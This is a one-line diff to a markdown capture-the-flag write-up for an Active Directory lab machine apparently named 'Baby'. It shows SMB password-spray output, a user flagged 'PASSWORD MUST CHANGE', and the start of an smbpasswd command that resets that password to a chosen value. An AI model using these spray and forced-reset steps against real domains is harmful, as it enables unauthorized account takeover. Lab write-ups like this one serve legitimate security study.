@@ -1071,6 +1071,7 @@ SMB         10.10.65.1      445    BABYDC           [-] baby.vl\Caroline.Robinso
 ```
 
 - During password spray, it is found that Caroline user with status of 'PASSWORD MUST CHANGE' and let try change password with smbpasswd and New SMB password will P@55w0rd
+
 ```
 └─$ smbpasswd -r 10.10.65.1 -U Caroline.Robinson
 Old SMB password:
